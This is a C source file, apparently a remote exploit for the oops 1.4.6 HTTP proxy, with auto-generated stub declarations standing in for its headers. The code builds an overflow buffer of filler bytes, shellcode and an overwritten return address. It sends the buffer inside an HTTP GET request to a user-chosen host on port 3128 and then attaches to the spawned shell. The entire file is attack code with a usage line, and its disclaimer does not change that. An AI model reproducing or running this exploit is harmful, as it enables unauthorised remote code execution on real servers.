
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_port; } ;
struct sockaddr {int dummy; } ;


 int AF_INET ;
 unsigned int BUFADDR ;
 char FIL ;
 int IPPROTO_TCP ;
 size_t OFFSET2 ;
 size_t RETOFF ;
 int SOCK_STREAM ;
 int SZ ;
 short atoi (char*) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int ) ;
 int fprintf (int ,char*,...) ;
 int htons (short) ;
 int memset (char*,char,int) ;
 int res (char*,struct sockaddr_in*) ;
 int send (int,char*,size_t,int ) ;
 int shellcode (char*) ;
 int socket (int ,int ,int ) ;
 int spawned_shell (int) ;
 int stderr ;
 int strcat (char*,char*) ;
 int strcpy (char*,char*) ;
 size_t strlen (char*) ;

main(int ac, char** av){


 char buf[0x2000],buf2[0x2000],*pc,c;
 int i,sock;
 struct sockaddr_in sin;
 short port=3128;
 unsigned *pu;
 memset(buf,0xbf,0x2000);
 shellcode(buf);
 buf[strlen(buf)]=0xbf;
 pc=&buf[OFFSET2];
 shellcode(pc);
 pc+=strlen(pc);
 *pc=0xbf;
 pu=(unsigned*)&buf[RETOFF];
 *pu=BUFADDR;
 buf[RETOFF+4]=0;
 strcpy(buf2,"GET http://p");
 strcat(buf2,buf);
 strcat(buf2," HTTP/1.0\r\n\r\n");
 fprintf(stderr,"oops-1.4.6 remote xpl0it for 4.x by diman.\n");
 fprintf(stderr,"use for educational purpose only.\n");
 if(ac<2) {
  fprintf(stderr,"usage: ./oopz target_host [port, def=3128]\n");
  exit(0);
 }
 pc=av[1];
 if(ac>2) port=atoi(av[2]);
 if(!res(pc,&sin)) {
  fprintf(stderr,"can't resolve %s\n",pc);
  exit(0);
 }
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 sin.sin_port=htons(port);
 if(connect(sock,(struct sockaddr*)&sin,sizeof(struct sockaddr))==-1) {
  fprintf(stderr,"can't connect %s:%d\n",pc,port);
  exit(0);
 }
 fprintf(stderr,"Connected. Sending surprise...\n");
 send(sock,buf2,strlen(buf2),0);
 spawned_shell(sock);
}
